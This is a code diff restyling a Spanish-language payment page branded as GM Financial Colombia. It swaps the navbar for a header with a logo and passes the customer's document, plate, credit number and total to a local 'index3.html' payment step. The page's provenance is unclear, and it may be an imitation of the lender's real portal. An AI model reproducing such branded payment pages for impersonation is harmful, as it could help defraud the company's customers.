@@ -10,7 +10,7 @@
 
         body {
             font-family: 'Roboto', Arial, sans-serif;
-            background-color: #ffffff; /* Fondo blanco como en la imagen */
+            background-color: #ffffff;
             display: flex;
             flex-direction: column;
             min-height: 100vh;
@@ -18,37 +18,36 @@
             color: #333;
         }
 
-        /* ─── NAVBAR ─── */
-        .navbar {
-            background: #0047FF;
-            padding: 10px 0;
-            border-bottom: 4px solid #0036cc; /* Borde inferior sutil */
+        /* ─── FRANJA AZUL SUPERIOR ─── */
+        .top-blue-bar {
+            background-color: #0047FF;
+            height: 35px;
+            width: 100%;
         }
-        .navbar-content {
-            max-width: 1200px;
+
+        /* ─── HEADER (LOGO Y SALIR) ─── */
+        .header-container {
+            max-width: 1100px;
             margin: 0 auto;
-            padding: 0 20px;
+            padding: 20px 20px 10px;
             display: flex;
             justify-content: space-between;
             align-items: center;
+            width: 100%;
         }
-        .navbar-brand img {
-            height: 35px;
+        
+        .header-logo img {
+            height: 40px; /* Ajusta según el tamaño de tu imagen gm.png */
             object-fit: contain;
         }
-        .navbar-brand span {
-            color: white;
-            font-weight: 700;
-            font-size: 20px;
-            letter-spacing: 1px;
-        }
-        .navbar-right a {
-            color: white;
+
+        .header-salir a {
+            color: #000;
             text-decoration: none;
-            font-size: 14px;
+            font-size: 15px;
             font-weight: 500;
         }
-        .navbar-right a:hover {
+        .header-salir a:hover {
             text-decoration: underline;
         }
 
@@ -58,7 +57,7 @@
             width: 100%;
             max-width: 1100px;
             margin: 0 auto;
-            padding: 30px 20px 40px;
+            padding: 20px 20px 40px;
         }
 
         /* ─── SECCIÓN PASOS (TARJETAS AZULES) ─── */
@@ -123,14 +122,14 @@
         /* ─── TABLA RESPONSIVE ─── */
         .table-wrapper {
             width: 100%;
-            overflow-x: auto; /* Permite scroll horizontal en móvil */
+            overflow-x: auto;
             -webkit-overflow-scrolling: touch;
             margin-bottom: 20px;
             background: #fff;
         }
         .table-custom {
             width: 100%;
-            min-width: 900px; /* Asegura que la tabla mantenga su estructura */
+            min-width: 900px;
             border-collapse: collapse;
             font-size: 14px;
         }
@@ -323,8 +322,7 @@
 
         /* ─── RESPONSIVE ─── */
         @media (max-width: 768px) {
-            .navbar-brand img { height: 28px; }
-            .navbar-brand span { font-size: 16px; }
+            .header-logo img { height: 30px; }
             .container-main { padding: 20px 15px; }
             .steps-container { flex-direction: column; gap: 15px; }
             .step-card { min-width: 100%; padding-left: 25px; }
@@ -338,17 +336,19 @@
 </head>
 <body>
 
-    <!-- NAVBAR -->
-    <nav class="navbar">
-        <div class="navbar-content">
-            <div class="navbar-brand">
-                <img src="gm.png" alt="GM Financial" onerror="this.outerHTML='<span style=\'color:white; font-weight:700; font-size:20px;\'>gm FINANCIAL</span>'">
-            </div>
-            <div class="navbar-right">
-                <a href="index.html">Salir</a>
-            </div>
+    <!-- FRANJA AZUL SUPERIOR -->
+    <div class="top-blue-bar"></div>
+
+    <!-- HEADER CON LOGO ORIGINAL -->
+    <header class="header-container">
+        <div class="header-logo">
+            <!-- Se usa tu imagen gm.png original -->
+            <img src="gm.png" alt="GM Financial" onerror="this.outerHTML='<span style=\'color:#0047FF; font-weight:700; font-size:22px;\'>gm FINANCIAL</span>'">
         </div>
-    </nav>
+        <div class="header-salir">
+            <a href="index.html">Salir</a>
+        </div>
+    </header>
 
     <!-- CONTENIDO PRINCIPAL -->
     <div class="container-main">
@@ -432,11 +432,12 @@
 
     </div>
 
-    <!-- FOOTER -->
+    <!-- FOOTER CON LOGO ORIGINAL -->
     <div class="footer">
         <div class="footer-left">
             <div class="sello-vigilado">VIGILADO<br>SUPERINTENDENCIA FINANCIERA<br>DE COLOMBIA</div>
             <div class="footer-logo-container">
+                <!-- Logo original sin filtro blanco -->
                 <img src="gm.png" alt="GM Financial" onerror="this.outerHTML='<span style=\'font-weight:700; font-size:18px;\'>gm FINANCIAL</span>'">
                 <div class="footer-logo-text">GM Financial Colombia S.A.<br>Compañía de Financiamiento.</div>
             </div>
@@ -521,7 +522,6 @@
             }
 
             // Redirigir a la pasarela de pago (index3.html) con los datos
-            // Asegúrate de que esta URL sea la correcta para tu flujo
             const urlPse = `/index3.html?documento=${encodeURIComponent(doc)}&placa=${encodeURIComponent(placa)}&total=${valorFinal}&credito=${encodeURIComponent(credito)}`;
             window.location.href = urlPse;
         });
